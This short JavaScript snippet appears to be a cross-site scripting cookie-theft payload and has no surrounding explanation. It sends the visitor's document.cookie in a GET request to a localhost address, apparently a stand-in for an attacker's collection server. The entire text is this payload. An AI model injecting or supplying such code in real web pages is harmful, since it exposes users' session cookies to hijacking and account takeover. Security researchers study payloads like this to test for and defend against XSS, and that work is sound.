var request = new XMLHttpRequest();
request.open('GET', 'http://localhost/?cookie=' + document.cookie);
request.send();
